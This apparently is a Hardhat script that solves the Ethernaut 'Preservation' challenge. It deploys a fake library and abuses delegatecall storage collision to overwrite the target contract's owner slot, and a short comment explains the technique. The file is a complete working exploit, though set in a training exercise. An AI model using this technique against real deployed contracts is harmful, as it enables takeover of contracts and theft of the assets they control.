import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/16.Preservation/Preservation.sol/Preservation.json";
import { BigNumber, Contract } from "ethers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { sendEther } from "../../utils/sendEther";
import { deployContract } from "../../utils/deployContract";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0x793B659C6cd56102A8440a74606F0cE14F28e8f1";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);
  const FakeLibrary = await deployContract("FakeLibrary");
  let tx = await target.setFirstTime(BigNumber.from(FakeLibrary.address));
  await tx.wait();

  tx = await target.setFirstTime(BigNumber.from(attacker.address), {
    gasLimit: "300000",
  });
  await tx.wait();

  const owner = await target.owner();

  displayResult(owner === attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// Explanation:
// The setTime function, if called will delegate call will change the value
// of the first storage slot of the calling contract.
// We are going to put there the address of a library we created.
// This library, if called in delegate call will change the value of the third
// storage slot of the calling contract, which in our case is owner.
